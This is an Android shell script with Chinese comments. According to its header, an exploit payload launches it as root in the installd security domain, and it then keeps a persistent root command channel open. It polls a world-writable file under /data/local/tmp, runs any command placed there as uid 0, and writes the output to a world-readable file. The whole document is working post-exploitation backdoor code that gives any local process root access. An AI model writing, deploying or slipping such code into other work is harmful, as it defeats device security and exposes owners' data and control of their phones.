#!/system/bin/sh
# r.sh —— 常驻 uid0 root 通道 (由漏斗载荷在 installd 域 exec, uid=0, u:r:installd:s0)
# 用法(shell 侧): echo '<命令>' > /data/local/tmp/.dfr/cmd ; 然后读 /data/local/tmp/.dfr/out
D=/data/local/tmp/.dfr
export PATH=/system/bin:/system/xbin
mkdir -p "$D" 2>/dev/null
chmod 777 "$D" 2>/dev/null
# 单实例锁: 漏斗可能被触发多次; 多实例时同一命令会被执行多遍(实测备份跑了两遍)
# 注意: /data/local/tmp 跨重启保留, 旧 pid 可能撞上重启后的无关进程 ⇒ 必须核对 cmdline
if [ -f "$D/pid" ]; then
  p=$(cat "$D/pid" 2>/dev/null)
  if [ -n "$p" ] && [ -r "/proc/$p/cmdline" ] && grep -qa 'r\.sh' "/proc/$p/cmdline" 2>/dev/null; then
    exit 0
  fi
  rm -f "$D/pid" 2>/dev/null
fi
echo $$ > "$D/pid"
chmod 666 "$D/pid" 2>/dev/null
{
  echo "=== DFR root channel ==="
  echo "uid=$(id -u)"
  echo "ctx=$(cat /proc/self/attr/current 2>/dev/null)"
  echo "pid=$$"
  echo "uptime=$(cat /proc/uptime 2>/dev/null)"
} > "$D/ready" 2>&1
chmod 666 "$D/ready" 2>/dev/null
rm -f "$D/out"
while :; do
  # mv 本身是原子锁: 只有真正抢到 cmd 的实例才执行, 输家退出这一拍
  if mv "$D/cmd" "$D/cmd.$$" 2>/dev/null; then
    sh -c "$(cat "$D/cmd.$$")" > "$D/out.$$" 2>&1
    rc=$?
    cp "$D/out.$$" "$D/out" 2>/dev/null
    echo "--- rc=$rc ---" >> "$D/out"
    rm -f "$D/out.$$" "$D/cmd.$$"
    chmod 666 "$D/out" 2>/dev/null
  fi
  sleep 1
done
